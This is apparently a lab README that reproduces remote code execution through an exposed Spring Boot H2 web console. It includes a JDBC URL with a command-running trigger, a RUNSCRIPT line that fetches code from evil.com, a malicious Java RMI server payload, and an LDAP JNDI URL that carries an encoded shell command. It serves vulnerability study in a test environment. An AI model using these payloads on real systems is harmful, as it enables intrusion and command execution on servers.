# H2 Database Web Console Unauthorized Access

[中文版本(Chinese version)](README.zh-cn.md)

H2 database is a embedded in-memory database in Java. Springboot with h2 database comes with a web management page which has no authentication if you set the following options:

```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

This management page supports to use JNDI to load the JDBC driver, which can lead to remote code execution via JDBC attacking or JNDI injection.

References:

- <https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html>
- <https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e>
- <https://www.exploit-db.com/exploits/45506>
- <https://github.com/h2database/h2database/pull/1580>
- <https://github.com/h2database/h2database/pull/1726>
- <https://github.com/h2database/h2database/issues/1225>

## Setup

Start a spring-boot with h2 database and embedded tomcat:

```
docker compose up -d
```

After started the container, the spring-boot is listening on `http://your-ip:8080`, the management page is `http://your-ip:8080/h2-console/` by default.

## Vulnerability Reproduce

There are two ways to exploit this vulnerability, one is the [JDBC attack](https://su18.org/post/jdbc-connection-url-attack/), the other is the [JNDI injection](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).

### JDBC Attack

The H2 console allows users to specify any JDBC URL. By specifying `jdbc:h2:mem:testdb` and using the JDBC `init` property, we can execute any SQL statements in the local memory server's memory.

The h2 database supports some special and dangerous commands, such as:

- `RUNSCRIPT FROM 'http://evil.com/script.sql'`
- `CREATE ALIAS func AS code ...; CALL func ...`
- `CREATE TRIGGER ... AS code ...`

We can use `CREATE TRIGGER` to construct a malicious SQL statement, then put it into the JDBC URL:

```
jdbc:h2:mem:testdb;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
    var is = java.lang.Runtime.getRuntime().exec("id").getInputStream()
    var scanner = new java.util.Scanner(is).useDelimiter("\\A")
    throw new java.lang.Exception(scanner.next())
$$;
```

Click "Test Connection" in the H2 console and capture the request, then modify the JDBC URL in the request to successfully execute the `id` command.

![](1.png)

### JNDI Injection

The H2 console after version 1.4.197 added a new [`-ifNotExists` option](https://github.com/h2database/h2database/pull/1726) that disable remote database creation by default. This new change makes it harder to exploit JDBC attacks in the absence of a known database.

However, the H2 console still supports JNDI injection, which can be used to execute arbitrary commands.

Reference to [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java), we can use `org.apache.naming.factory.BeanFactory` and `javax.el.ELProcessor` to launch the external process after Java 8u191:

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServerNew {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

Simply use this tool [JNDIExploit](https://github.com/vulhub/JNDIExploit) to exploit the vulnerability.

Start the `JNDIExploit` and fill in the form based on these pieces of information:

![](2.png)

`javax.naming.InitialContext` is the JNDI factory class name, URL `ldap://172.17.0.1:1389/TomcatBypass/Command/Base64/dG91Y2ggL3RtcC9zdWNjZXNz` is your evil JNDI url.

Evil JNDI server received the requests:

![](3.png)

As you can see, `touch /tmp/success` has been executed successfully:

![](4.png)
